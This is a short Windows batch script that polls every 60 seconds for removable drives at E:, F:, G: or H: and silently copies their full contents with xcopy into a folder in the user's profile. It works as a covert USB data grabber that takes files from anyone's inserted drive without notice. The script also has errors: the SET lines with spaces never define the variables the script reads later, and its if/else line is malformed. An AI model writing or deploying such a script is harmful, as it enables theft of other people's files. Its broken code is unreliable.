@echo off
SET var = 0
SET file = "C:\Users\%username%\copied"
goto start

:: potential D drive as USB volume 

:f
xcopy /e /y F: %file%
SET var = 1
goto done

:e
xcopy /e /y E: %file%
SET var = 1
goto done

:g
xcopy /e /y G: %file%
SET var = 1
goto done

:h
xcopy /e /y H: %file%
SET var = 1
goto done

:done
if %var%==1 exit else goto start

:start
timeout /t 60 /nobreak >nul
if exist F: (goto f)
if exist E: (goto e)
if exist G: (goto g) else (goto h)
goto start
